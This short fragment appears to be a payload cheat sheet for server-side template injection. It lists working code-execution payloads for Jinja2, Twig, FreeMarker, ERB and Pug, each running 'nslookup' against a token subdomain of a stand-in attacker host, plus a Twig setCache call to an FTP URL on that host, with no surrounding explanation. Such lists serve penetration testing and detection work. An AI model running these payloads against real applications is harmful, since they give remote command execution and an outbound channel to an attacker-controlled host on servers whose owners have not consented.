...
{{_self.env.setCache("ftp://test-attacker.com/")}}
...
```text
# Jinja2
{{lipsum.__globals__.os.popen('nslookup TOKEN.test-attacker.com').read()}}

# Twig
{{['nslookup TOKEN.test-attacker.com']|map('system')}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup TOKEN.test-attacker.com")}

# ERB
<%= `nslookup TOKEN.test-attacker.com` %>

# Pug/Jade
#{root.process.mainModule.require('child_process').execSync('nslookup TOKEN.test-attacker.com')}
```
